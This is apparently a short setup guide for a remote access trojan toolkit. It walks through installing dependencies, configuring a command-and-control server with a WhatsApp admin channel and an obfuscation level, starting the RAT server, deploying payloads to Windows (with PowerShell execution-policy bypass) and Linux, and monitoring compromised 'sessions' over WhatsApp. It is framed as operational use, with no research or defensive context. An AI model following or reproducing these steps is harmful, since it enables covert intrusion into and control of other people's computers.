STARTING THE SETUP SYSTEM
═══════════════════════════════════════════════════════════════════════════════

Step 1: Install Dependencies
  $ pip3 install -r requirements.txt
  $ cd whatsapp-c2 && npm install && cd ..

Step 2: Run Launcher
  $ python3 launcher.py

Step 3: Select Setup Type
  Option 1: Quick Setup (recommended for first-time)
  Option 2: Manual configuration (fine control)

Step 4: Answer Configuration Questions
  - C2 server address/port
  - Payload target address
  - WhatsApp admin phone number
  - Obfuscation level
  - Database location

Step 5: Start Services
  Terminal 1: python3 rat_server_fixed.py
  Terminal 2: cd whatsapp-c2 && npm start

Step 6: Deploy Payload
  Windows: powershell -ExecutionPolicy Bypass -File deploy_windows.ps1
  Linux:   bash deploy_linux.sh

Step 7: Monitor
  WhatsApp: /sessions (check active systems)
            /help (list all commands)
